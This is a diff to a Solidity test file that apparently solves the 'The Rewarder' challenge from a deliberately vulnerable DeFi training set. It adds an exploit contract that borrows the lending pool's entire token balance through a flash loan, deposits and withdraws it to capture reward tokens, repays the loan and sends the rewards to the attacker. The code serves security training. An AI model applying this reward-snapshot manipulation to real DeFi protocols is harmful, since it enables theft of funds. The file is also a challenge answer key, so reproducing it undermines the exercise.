@@ -88,7 +88,12 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.warp(block.timestamp + 5 days);
+        vm.startPrank(address(attacker));
+        TheRewarderExploiter theRewarderExploiter =
+            new TheRewarderExploiter(theRewarderPool, flashLoanerPool, dvt, attacker);
+        theRewarderExploiter.exploit();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -109,12 +114,49 @@ contract TheRewarder is Test {
         // Rewards must have been issued to the attacker account
         assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
         uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);
-
         // The amount of rewards earned should be really close to 100 tokens
         uint256 deltaAttacker = 100e18 - rewardAttacker;
         assertLt(deltaAttacker, 1e17);
-
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract TheRewarderExploiter {
+    TheRewarderPool victim;
+    FlashLoanerPool loanerPool;
+    DamnValuableToken liquidityToken;
+    address attacker;
+
+    constructor(
+        TheRewarderPool _victim,
+        FlashLoanerPool _loanerPool,
+        DamnValuableToken _liquidityToken,
+        address _attacker
+    ) {
+        victim = _victim;
+        loanerPool = _loanerPool;
+        liquidityToken = _liquidityToken;
+        attacker = _attacker;
+    }
+
+    function exploit() external {
+        uint256 amount = liquidityToken.balanceOf(address(loanerPool));
+        loanerPool.flashLoan(amount);
+    }
+
+    function receiveFlashLoan(uint256 receivedAmount) external {
+        // approve liquidityToken to be spent by the pool
+        liquidityToken.approve(address(victim), receivedAmount);
+        // deposit and withdraw to get the rewards
+        victim.deposit(receivedAmount);
+        victim.withdraw(receivedAmount);
+        // payback loan
+        bool transfered = liquidityToken.transfer(address(loanerPool), receivedAmount);
+        require(transfered);
+        // send reward to attacker
+        uint256 balance = victim.rewardToken().balanceOf(address(this));
+        transfered = victim.rewardToken().transfer(attacker, balance);
+        require(transfered);
     }
 }
